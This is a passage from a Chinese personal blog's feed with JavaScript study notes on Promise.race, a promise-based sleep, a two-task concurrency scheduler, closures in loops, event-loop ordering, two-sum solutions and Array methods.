&#125;)</span><br><span class="line">    .catch(() =&gt; &#123;</span><br><span class="line">      console.log(&#x27;err&#x27;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">Promise.all([p1, p2, p3, p4])</span><br><span class="line">    .then(() =&gt; &#123;</span><br><span class="line">      console.log(&#x27;ok&#x27;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .catch((err) =&gt; &#123;</span><br><span class="line">       console.log(err); //p4-err</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>Promise.race(iterable)</strong><br>Promise.race方法同样是将多个Promise实例，包装成一个新的Promise实例。只要p1、p2、p3之中有一个实例率先改变状态，p的状态就跟着改变。那个率先改变的Promise实例的返回值，就传递给p的回调函数。<br>Promise.race方法的参数与Promise.all方法一样，如果不是Promise实例，就会先调用下面讲到的Promise.resolve方法，将参数转为Promise实例，再进一步处理。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">var p1 = new Promise(resolve =&gt; &#123;setTimeout(resolve, 500, &quot;one&quot;);&#125;);</span><br><span class="line">var p2 = new Promise(resolve =&gt; &#123;setTimeout(resolve, 100, &quot;two&quot;);&#125;);</span><br><span class="line">Promise.race([p1, p2])</span><br><span class="line">    .then(value =&gt; &#123;</span><br><span class="line">        console.log(value); // &quot;two&quot;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">var p3 = new Promise(resolve =&gt; &#123;setTimeout(resolve, 100, &quot;three&quot;);&#125;);</span><br><span class="line">var p4 = new Promise((resolve, reject) =&gt; &#123;setTimeout(reject, 500, &quot;four&quot;);&#125;);</span><br><span class="line"></span><br><span class="line">Promise.race([p3, p4])</span><br><span class="line">    .then((value) =&gt; &#123;</span><br><span class="line">        console.log(value); // &quot;three&quot;</span><br><span class="line">    &#125;)</span><br><span class="line">    .catch(err =&gt; &#123;</span><br><span class="line">        // 未被调用  </span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">var p5 = new Promise(resolve =&gt; &#123;setTimeout(resolve, 500, &quot;five&quot;);&#125;);</span><br><span class="line">var p6 = new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">          setTimeout(reject, 100, &quot;six&quot;);</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">Promise.race([p5, p6])</span><br><span class="line">    .then((value) =&gt; &#123;</span><br><span class="line">      // 未被调用             </span><br><span class="line">    &#125;).catch((reason) =&gt; &#123;</span><br><span class="line">        console.log(reason); // &quot;six&quot;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="10"><li>用js实现sleep，用promise</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function sleep(time) &#123;</span><br><span class="line">  return new Promise(resolve =&gt; setTimeout(resolve, time))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const t1 = +new Date()</span><br><span class="line">sleep(3000).then(() =&gt; &#123;</span><br><span class="line">  const t2 = +new Date()</span><br><span class="line">  console.log(t2 - t1)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>优点：这种方式实际上是用了 setTimeout，没有形成进程阻塞，不会造成性能和负载问题。<br>缺点：虽然不像 callback 套那么多层，但仍不怎么美观，而且当我们需要在某过程中需要停止执行（或者在中途返回了错误的值），还必须得层层判断后跳出，非常麻烦，而且这种异步并不是那么彻底，还是看起来别扭。</p><ol start="11"><li>实现一个 Scheduler 类，完成对Promise的并发处理，最多同时执行2个任务 &lt;TODO 理解&gt;</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">class Scheduler &#123;</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        this.tasks = [], // 待运行的任务</span><br><span class="line">        this.usingTask = [] // 正在运行的任务</span><br><span class="line">    &#125;</span><br><span class="line">    // promiseCreator 是一个异步函数，return Promise</span><br><span class="line">    add(promiseCreator) &#123;</span><br><span class="line">        return new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">            promiseCreator.resolve = resolve</span><br><span class="line">            if (this.usingTask.length &lt; 2) &#123;</span><br><span class="line">                this.usingRun(promiseCreator)</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                this.tasks.push(promiseCreator)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    usingRun(promiseCreator) &#123;</span><br><span class="line">        this.usingTask.push(promiseCreator)</span><br><span class="line">        promiseCreator().then(() =&gt; &#123;</span><br><span class="line">            promiseCreator.resolve()</span><br><span class="line">            this.usingMove(promiseCreator)</span><br><span class="line">            if (this.tasks.length &gt; 0) &#123;</span><br><span class="line">                this.usingRun(this.tasks.shift())</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    usingMove(promiseCreator) &#123;</span><br><span class="line">        let index = this.usingTask.findIndex(promiseCreator)</span><br><span class="line">        this.usingTask.splice(index, 1)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const timeout = (time) =&gt; new Promise(resolve =&gt; &#123;</span><br><span class="line">    setTimeout(resolve, time)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">const scheduler = new Scheduler()</span><br><span class="line"></span><br><span class="line">const addTask = (time, order) =&gt; &#123;</span><br><span class="line">    scheduler.add(() =&gt; timeout(time)).then(() =&gt; console.log(order))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">addTask(400, 4) </span><br><span class="line">addTask(200, 2) </span><br><span class="line">addTask(300, 3) </span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="12"><li>循环i，setTimeout 中输出什么，如何解决（块级作用域，函数作用域）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for (var i = 0; i&lt; 10; i++)&#123;</span><br><span class="line">   setTimeout((i) =&gt; &#123;</span><br><span class="line">   console.log(i);</span><br><span class="line">   &#125;, 0)</span><br><span class="line">&#125;//期望：输出1到10</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>方法一</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for (var i = 0; i&lt; 10; i++)&#123;</span><br><span class="line">   setTimeout((i) =&gt; &#123;</span><br><span class="line">      console.log(i)</span><br><span class="line">   &#125;, 1000,i);</span><br><span class="line">&#125;</span><br><span class="line">//最精简解决方案</span><br></pre></td></tr></table></figure><ul><li>方法二</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for (let i = 0; i&lt; 10; i++)&#123;</span><br><span class="line">   setTimeout(() =&gt; &#123;</span><br><span class="line">      console.log(i) </span><br><span class="line">   &#125;, 1000);</span><br><span class="line">&#125;</span><br><span class="line">//最优解决方案，利用let形成块级作用域</span><br></pre></td></tr></table></figure><ul><li>方法三</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    for (var i = 0; i&lt; 10; i++)&#123;</span><br><span class="line">      ((i)=&gt;&#123;</span><br><span class="line">        setTimeout(() =&gt; &#123;</span><br><span class="line">          console.log(i)</span><br><span class="line">        &#125;,1000);</span><br><span class="line">      &#125;)(i)</span><br><span class="line">    &#125;</span><br><span class="line">//IIFE(立即执行函数)，类似于let生成了块级作用域。</span><br></pre></td></tr></table></figure><ol start="13"><li>js执行顺序的题目，涉及到settimeout、console、process.nextTick、promise.then</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">console.time(&#x27;start&#x27;);</span><br><span class="line"></span><br><span class="line">setTimeout(function() &#123;</span><br><span class="line">  console.log(2);</span><br><span class="line">&#125;, 10);</span><br><span class="line"></span><br><span class="line">setImmediate(function() &#123;</span><br><span class="line">  console.log(1);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">new Promise(function(resolve) &#123;</span><br><span class="line">  console.log(3);</span><br><span class="line">  resolve();</span><br><span class="line">  console.log(4);</span><br><span class="line">&#125;).then(function() &#123;</span><br><span class="line">  console.log(5);</span><br><span class="line">  console.timeEnd(&#x27;start&#x27;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">console.log(6);</span><br><span class="line"></span><br><span class="line">process.nextTick(function() &#123;</span><br><span class="line">  console.log(7);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">console.log(8);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考答案：<br>综合的执行顺序就是：3——&gt;4——&gt;6——&gt;8——&gt;7——&gt;5——&gt;start: 7.009ms——&gt;1——&gt;2<br><strong>解析：</strong><br>主体部分： 定义promise的构造部分是同步的，因此先输出3、4 ，主体部分再输出6、8（同步情况下，就是严格按照定义的先后顺序）<br>process.nextTick: 输出7<br>promise： 这里的promise部分，严格的说其实是promise.then部分，输出的是5、以及 timeEnd(‘start’)<br>setImmediate：输出1，依据上面优先级，应该先setTimeout，但是注意，setTimeout 设置 10ms 延时<br>setTimeout ： 输出2</p><p>本题目，考察的就是 node 事件循环 Event Loop 我们可以简单理解Event Loop如下：<br>所有任务都在主线程上执行，形成一个执行栈(Execution Context Stack)<br>在主线程之外还存在一个任务队列(Task Queen),系统把异步任务放到任务队列中，然后主线程继续执行后续的任务<br>一旦执行栈中所有的任务执行完毕，系统就会读取任务队列。如果这时异步任务已结束等待状态，就会从任务队列进入执行栈，恢复执行<br>主线程不断重复上面的第三步<br>在上述的例子中，我们明白首先执行主线程中的同步任务，因此依次输出3、4、6、8。当主线程任务执行完毕后，再从Event Loop中读取任务。</p><p>宏任务 Macrotask宏任务是指Event Loop在每个阶段执行的任务<br>微任务 Microtask微任务是指Event Loop在每个阶段之间执行的任务<br>我们举例来看执行顺序的规定，我们假设<br>宏任务队列包含任务: A1, A2 , A3<br>微任务队列包含任务: B1, B2 , B3<br>执行顺序为，首先执行宏任务队列开头的任务，也就是 A1 任务，执行完毕后，在执行微任务队列里的所有任务，也就是依次执行B1, B2 , B3，执行完后清空微任务队中的任务，接着执行宏任务中的第二个任务A2，依次循环。<br>了解完了宏任务 Macrotask和微任务 Microtask两种队列的执行顺序之后，我们接着来看，真实场景下这两种类型的队列里真正包含的任务（我们以node V8引擎为例），在node V8中，这两种类型的真实任务顺序如下所示：<br><font color="#FF8C00">宏任务 Macrotask队列真实包含任务</font>：script(主程序代码),setTimeout, setInterval, setImmediate, I/O, UI rendering<br><font color="#FF8C00">微任务 Microtask队列真实包含任务</font>: process.nextTick, Promises, Object.observe, MutationObserver<br><font color="#FF00FF">在ES6中宏任务 Macrotask队列又称为ScriptJobs，而微任务 Microtask又称PromiseJobs</font></p><p><font color="#DC143C">script(主程序代码)——&gt;process.nextTick——&gt;promise——&gt;setTimeout——&gt;setImmediate</font></p>]]></content>
    
    
    <summary type="html">每天学习计划</summary>
    
    
    
    <category term="plan" scheme="https://merlynr.github.io/categories/plan/"/>
    
    
    <category term="daily" scheme="https://merlynr.github.io/tags/daily/"/>
    
    <category term="study" scheme="https://merlynr.github.io/tags/study/"/>
    
    <category term="graduate student" scheme="https://merlynr.github.io/tags/graduate-student/"/>
    
    <category term="plan" scheme="https://merlynr.github.io/tags/plan/"/>
    
  </entry>
  
  <entry>
    <title>算法之数组（2）</title>
    <link href="https://merlynr.github.io/2022/08/02/%E7%AE%97%E6%B3%95%E4%B9%8B%E6%95%B0%E7%BB%84%EF%BC%882%EF%BC%89/"/>
    <id>https://merlynr.github.io/2022/08/02/%E7%AE%97%E6%B3%95%E4%B9%8B%E6%95%B0%E7%BB%84%EF%BC%882%EF%BC%89/</id>
    <published>2022-08-01T16:00:00.000Z</published>
    <updated>2022-08-01T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="实例题"><a href="#实例题" class="headerlink" title="实例题"></a>实例题</h1><blockquote><p>// 给定一个整数数组 nums和一个目标值 target，<br>// 请你在该数组中找出和为目标值的那两个整数，并返回他们的数组下标。<br>// 你可以假设每种输入只会对应一个答案。<br>// 但是，你不能重复利用这个数组中同样的元素。<br>// 示例:<br>//    给定 nums = [2, 7, 11, 15], target = 9;<br>//    因为 nums[0] + nums[1] = 2 + 7 = 9,<br>//    所以返回 [0, 1]。</p></blockquote><h1 id="暴力双-for-循环解法"><a href="#暴力双-for-循环解法" class="headerlink" title="暴力双 for 循环解法"></a>暴力双 for 循环解法</h1><p><img src="https://files.shanqianche.cn/20228/1659450770164.png" alt="暴力双 for 循环破解"><br><font color="#FF00FF">时间复杂度</font>：O(n^2),可能看似感觉还不错，但是执行时间长，内存占用也不小，当 nums 数组足够大时，它的性能瓶颈就会体现出来。</p><p><img src="https://files.shanqianche.cn/20228/1659453577804.png" alt="res"></p><h1 id="单循环-indexOf-优化"><a href="#单循环-indexOf-优化" class="headerlink" title="单循环 indexOf 优化"></a>单循环 indexOf 优化</h1><p><img src="https://files.shanqianche.cn/20228/1659452119737.png" alt="单循环 indexOf 优化"></p><p><font color="#FF00FF">时间复杂度：</font>O(n^2),因为 indexOf()方法的时间复杂度为 O(n),所以和上述暴力破解只是写法上区别了。执行时间，内存占用依然存在可优化的空间。</p><p><img src="https://files.shanqianche.cn/20228/1659453595273.png" alt="res"></p><h1 id="单循环-obj-优化"><a href="#单循环-obj-优化" class="headerlink" title="单循环 obj 优化"></a>单循环 obj 优化</h1><p><img src="https://files.shanqianche.cn/20228/1659453540413.png" alt="单循环 obj 优化"><br><font color="#FF00FF">时间复杂度：</font>O(n),由于对象键值对 key-value 的优越性，对于作为查找类的算法很有优势。时间复杂度降为原有的一倍，性能会好一些。</p><p><img src="https://files.shanqianche.cn/20228/1659453608333.png" alt="res"></p><h1 id="单循环-map-优化"><a href="#单循环-map-优化" class="headerlink" title="单循环 map 优化"></a>单循环 map 优化</h1><p><img src="https://files.shanqianche.cn/20228/1659454347806.png" alt="单循环 map 优化"><br><font color="#FF00FF">时间复杂度：</font>O(2n),第一次循环时间度 n,第二次为 n*1，故为 O(2n), 由于 map 的特殊数据结构，故作为查找类的算法，相比 obj 具有绝对优势。</p><p><img src="https://files.shanqianche.cn/20228/1659454447460.png" alt="res"></p><h1 id="单循环尾递归优化"><a href="#单循环尾递归优化" class="headerlink" title="单循环尾递归优化"></a>单循环尾递归优化</h1><p><img src="https://files.shanqianche.cn/20228/1659454936694.png" alt="obj 尾递归优化"><br><font color="#FF00FF">时间复杂度：</font>O(n),假设我们查找到,则递归的次数应该是最多的为 n，所以时间复杂度 O(n); 递归相比于 for 循环是一种更近层次的查找，在树结构数据、多维数组中我们常用递归思想来处理数据。</p><p><img src="https://files.shanqianche.cn/20228/1659454979758.png" alt="res"></p><p><img src="https://files.shanqianche.cn/20228/1659455431271.png" alt="map 尾递归优化破解"><br><font color="#FF00FF">时间复杂度：</font>O(n),假设我们查找到,则递归的次数为 n，所以时间复杂度也为 O(n);</p><p><img src="https://files.shanqianche.cn/20228/1659455479861.png" alt="res"></p><p><font color="#bf242a">在面试中与实际工作中，简单数组算法的几点经验之谈：</font><br>数组去重：使用单循环，结合 obj 或 map 做中间辅助判断； 数组扁平化：使用递归；<br>树结构的查找与处理：单循环使用 obj/map 做中间辅助判断，同时结合递归思想；<br>数组的特定重组：除了上述思想外，可能要结合数组常用方法：indexOf(),map(),forEach()或数组高阶函数 filter(),reduce(),sort(),every(),some()等。</p>]]></content>
    
    
    <summary type="html">每天学习计划</summary>
    
    
    
    <category term="plan" scheme="https://merlynr.github.io/categories/plan/"/>
    
    
    <category term="daily" scheme="https://merlynr.github.io/tags/daily/"/>
    
    <category term="study" scheme="https://merlynr.github.io/tags/study/"/>
    
    <category term="graduate student" scheme="https://merlynr.github.io/tags/graduate-student/"/>
    
    <category term="plan" scheme="https://merlynr.github.io/tags/plan/"/>
    
  </entry>
  
  <entry>
    <title>算法之数组</title>
    <link href="https://merlynr.github.io/2022/08/02/%E7%AE%97%E6%B3%95%E4%B9%8B%E6%95%B0%E7%BB%84(1)/"/>
    <id>https://merlynr.github.io/2022/08/02/%E7%AE%97%E6%B3%95%E4%B9%8B%E6%95%B0%E7%BB%84(1)/</id>
    <published>2022-08-01T16:00:00.000Z</published>
    <updated>2022-08-01T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>原文地址 <a href="https://blog.csdn.net/Dandrose/article/details/123483066">blog.csdn.net</a></p></blockquote><p>MDN 参考文档： <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array" title="Array - JavaScript | MDN">Array - JavaScript | MDN</a><br><strong>①数组检测</strong><br>var colors = [‘red’, ‘blue’, ‘green’]<br>ECMAScript5 新增 Array.isArray() 方法，目的是最终确定某个值到底是不是<a href="https://so.csdn.net/so/search?q=%E6%95%B0%E7%BB%84&spm=1001.2101.3001.7020">数组</a>：<br>if (Array.isArray(colors)) {<br>        // 对数组执行某些操作<br>}<br><strong>②数组转换</strong><br>var colors = [‘red’, ‘blue’, ‘green’]<br>console.log(colors.toString()) // ‘red,blue,green’，返回数组中每个值的字符串形式拼接成的以逗号分隔的字符串。<br>console.log(colors.valueOf()) // [‘red’, ‘blue’, ‘green’]，返回的是数组本身<br>数组继承的 toLocalString()、toString() 和 valueOf() 方法，在默认情况下，都会以逗号分隔的字符串形式返回数组项。<br>而使用 join() 方法，可以使用不同的分隔符来构建这个字符串。<br>join() 方法只接收一个参数：用作分隔符的字符串<br>console.log(colors.join(‘,’)) // red,green,blue<br>console.log(colors.join(‘’)) // redgreenblue<br>console.log(colors.join(‘||’)) // red||green||blue<br>若不给 join() 方法传递任何值，或者给它传入 undefined，则使用逗号作为分隔符。<br><strong>③数组的栈方法（<strong><strong>LIFO</strong></strong>，<strong><strong>Last-In-First-Out</strong></strong>，<strong><strong>后进先出</strong></strong>的数据结构）</strong><br>栈的插入和移除，只发生在栈的顶部。<br>1.push()：可以接收任意数量的参数，将其逐个添加到数组末尾，并返回修改后数组的长度<br>2.pop()：从数组末尾移除最后一项，减少数组的 length，返回移除的项<br>var colors = new Array() // create an array<br>var count = colors.push(‘red’, ‘green’) // 插入两项<br>console.log(count) // 2<br>count = colors.push(‘black’) // 插入另一项<br>console.log(count) // 3<br>var item = colors.pop() // 取得最后一项<br>console.log(item) // ‘black’<br><strong>④<strong><strong>数组的队列方法（</strong></strong>FIFO<strong><strong>，</strong></strong>First-In-First-Out****，先进先出的数据结构）</strong><br>队列在列表的末端添加项，从列表的前端移除项。可以使用以下两种组合，像使用队列一样使用数组：<br>1.shift()：移除数组中的第一项并返回该项，同时数组 length 减 1<br>var colors = [‘red’, ‘blue’, ‘green’]<br>var item = colors.shift() // 取得第一项<br>console.log(item) // ‘red’<br>console.log(colors.length) // 2<br>2.unshift()：在数组前端<font color="#FF8C00">添加</font>任意个项并<font color="#FF8C00">返回新数组的长度</font><br>var colors = new Array() // create an array<br>var count = colors.unshift(“red”, “green”) // 插入两项<br>console.log(count);  // 2<br><strong>⑤数组排序方法</strong><br>1.reverse()：翻转数组<br>var values = [1,2,3,4,5]<br>console.log(values.reverse()) // [5, 4, 3, 2, 1]，翻转数组的顺序<br>2.sort()：对数组进行排序<br>默认情况下，sort() 方法按<font color="#FF8C00">升序</font>排列数组项——即最小的值位于最前面。为了实现排序，sort() 方法会调用每个数组项的<font color="#FF8C00"> toString() 转型方法，然后比较得到的字符串</font>，<font color="#FF00FF">即使数组项是数值，sort() 方法比较的也是字符串</font><br>var values = [0, 1, 15, 5, 10]<br>console.log(values.sort()) // 0,1,10,15,5  默认进行<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>比较，所有 10 和 15 都在 5 的前面<br>若想通过 sort() 得到降序或者升序，可以传递一个<font color="#bf242a">比较函数</font><br>console.log(values.sort((a, b) =&gt; a - b))<br>function compare (a, b) {<br> <strong>return a - b // 升序</strong><br> <strong>return b - a // 降序</strong><br>}<br>function compare (a, b) {  <strong>//</strong> <strong>升序</strong><br>        if (a &lt; b) {<br>                return -1<br>        } <strong>else if (a&gt; b) {</strong><br> <strong>return 1</strong><br>        } else {<br>                0<br>}<br>function compare (a, b) {  <strong>//</strong> <strong>降序</strong><br> **if (a &lt; b) {**<br> **return 1**<br>        } else if (a&gt; b) {<br>                return -1<br>        } else {<br>                0<br>        }<br>}</p><p><strong>⑥数组****操作方法</strong><br>1.concat()：<font color="#FF00FF">基于当前数组中的所有项创建一个新数组</font></p><ul><li>  在没有传参时，<font color="#FF00FF">它只是复制当前数组并返回副本</font></li><li>  如果传递的<font color="#FF00FF">是 1 个或多个数组，则会将这些数组中的每一项都添加到结果数组中</font></li><li>  如果传递的值不是数组，这些值就会被简单地<font color="#FF00FF">添加到结果数组的末尾</font><br>var colors = [‘red’, ‘green’, ‘blue’]<br>var colors2 = colors.concat(‘yellow’, [‘black’, ‘brown’])<br>console.log(‘colors2:’, colors2) // [‘red’, ‘green’, ‘blue’, ‘yellow’, ‘black’, ‘brown’]</li></ul><p>2.slice()：**<font color="#FF00FF">不改变原数组</font><strong>，</strong><font color="#FF00FF">返回一个新的数组</font>**，包含从 start 到 end （不包括该元素）的 元素<br>slice() 方法可从已有的数组中返回选定的元素。<br>slice() 方法可提取字符串的某 2 个部分，并以新的字符串返回被提取的部分。<br><strong>注意：</strong> slice() 方法不会改变原始数组。<br><strong>语法：</strong>array.slice(start, end)</p><table cellspacing="0"><tbody><tr><td><p><strong>参数</strong></p></td><td><p><strong>描述</strong></p></td></tr><tr><td><p><em>start</em></p></td><td><p><strong>可选</strong>。规定从何处开始选取。如果是负数，那么它规定从数组尾部开始算起的位置。如果该参数为负数，则表示从原数组中的倒数第几个元素开始提取，<strong>slice(-2)</strong> 表示提取原数组中的倒数第二个元素到最后一个元素（包含最后一个元素）。</p></td></tr><tr><td><p><em>end</em></p></td><td><p><strong>可选</strong>。规定从何处结束选取。该参数是数组片断结束处的数组下标。如果没有指定该参数，那么切分的数组包含从 start 到数组结束的所有元素。如果该参数为负数， 则它表示在原数组中的倒数第几个元素结束抽取。 slice(-2,-1) 表示抽取了原数组中的倒数第二个元素到最后一个元素（不包含最后一个元素，也就是只有倒数第二个元素）。</p></td></tr></tbody></table><ul><li>  只有一个参数时：返回从该参数指定位置开始到当前数组末尾的所有项。</li><li>  有两个参数时：返回起始和结束位置之间的项，<font color="#FF00FF">不包括结束位置的项</font>。</li></ul><p>var nums = [1, 2, 3, 4, 5]<br>var nums1 = nums.slice(1) // 2, 3, 4, 5<br>var nums2 = nums.slice(1, 4) // 2, 3, 4</p><p>3.splice()：算是最强大的数组方法，主要用途是向数组的中部插入项。</p><ul><li>  删除任意数量的项，2 个参数<br>splice(0,2); <strong>// 0<strong><strong>：要删除的第一项位置；</strong></strong>2****：要删除的项数</strong></li><li>  插入指定位置任意数量的项，3 个参数<br>splice(2, 0, ‘red’, ‘green’) <strong>// 2<strong><strong>：起始位置；</strong></strong>0****：要删除的项数；要插入的项</strong></li><li>  替换，向指定位置插入任意数量的项，同时删除任意数量的项，3 个参数<br>splice(2, 1, ‘red’, ‘green’) <strong>// 2<strong><strong>：起始位置；</strong></strong>1****：要删除的项数；要插入的任意数量的项</strong><br>splice() 方法**<font color="#FF00FF">会改变原数组</font>** ，<font color="#FF8C00">同时返回一个数组，包含从原始数组中删除的项，若未删除，则返回一个空数组</font>。</li></ul><p>var colors = [‘red’, ‘green’, ‘blue’]<br><strong>var removed = colors.splice(0,1) //</strong> <strong>删除第一项</strong><br>alert(colors) // [‘green, blue’]<br>alert(removed) // [‘red’]，<font color="#FF8C00">返回数组中只包含一项</font></p><p>4.flat()：参数默认值为 1，按照一个可指定的深度递归遍历数组，并将所有元素与遍历到的子数组中的元素合并为一个新数组返回<br>var nums = [1, 2, [3, [4]], 5]<br>console.log(nums.flat(0)) // [1, 2, [3, [4]], 5]<br>console.log(nums.flat(1)) // [1, 2, 3, [4], 5]<br>console.log(nums.flat(2)) // [1, 2, 3, 4, 5]</p><p><strong>⑦数组位置方法</strong><br>indexOf() 和 lastIndexOf() 均接收两个参数：<br>Ⅰ. 要查找的项<br>Ⅱ.（可选）表示查找起点位置的索引</p><p>两个方法查找成功都返回该项在数组中的位置，<font color="#FF8C00">没找到时返回 -1</font></p><p>1.indexOf()：从数组的开头 (位置 0) 开始向后查找<br>var numbers = [1, 2, 3, 4, 5, 4, 3, 2, 1]<br>console.log(numbers.indexOf(4)) // 3<br>console.log(numbers.indexOf(4, 4)) // 5</p><p>2.lastIndexOf()：从数组的末尾开始向前查找<br>console.log(numbers.lastIndexOf(4)) // 5<br>console.log(numbers.lastIndexOf(4, 4)) // 3</p><p>3.at()：方法<font color="#FF00FF">接收一个整数值并返回该索引的项目</font>，允许正数和负数。<font color="#FF00FF">负整数从数组中的最后一个项目开始倒数。</font></p><p>var nums = [1, 2, 3, 4, 5]<br>console.log(nums.at(0)) // 1<br>console.log(nums.at(1)) // 2<br>console.log(nums.at(-1)) // 5</p><p><strong>⑧****数组归并方法</strong></p><p>ECMAScript5 新增了两个归并数组的方法：reduce() 和 reduceRight()</p><p>这两个方法都接收<font color="#FF8C00">两个</font>参数：</p><p>Ⅰ. 在<font color="#FF8C00">每一项上调用的函数</font>。<br>Ⅱ.（可选）<font color="#FF8C00">作为归并基础的初始值</font>。</p><p>传给这两个方法的函数接收 <font color="#FF00FF">4</font> 个参数：</p><p>Ⅰ.acc 累计器（<font color="#FF8C00">累计回调的返回值，是上一次调用回调时返回的累积值</font>）<br>Ⅱ.cur 当前值<br>Ⅲ.index 当前值的索引<br>Ⅳ.array 数组对象</p><p>1.reduce()：从数组第一项开始，逐个遍历到最后<br>方法接收一个函数作为累加器，数组中的每个值（从左到右）开始缩减，最终计算为一个值。</p><p>reduce() 可以作为一个高阶函数，用于函数的 compose。<br>注意:<font color="#FF00FF"> reduce() 对于空数组是不会执行回调函数的</font>。</p><p>语法：array.reduce(function(total, currentValue, currentIndex, arr), initialValue)</p><table cellspacing="0"><tbody><tr><td><p><strong>参数</strong></p></td><td><p><strong>描述</strong></p></td></tr><tr><td><p><em>function(total,currentValue, index,arr)</em></p></td><td><p>必需。用于执行每个数组元素的函数。</p><p>函数参数:</p><table cellspacing="0"><tbody><tr><td><p><strong>参数</strong></p></td><td><p><strong>描述</strong></p></td></tr><tr><td><p><strong>total</strong></p></td><td><p>必需。初始值, 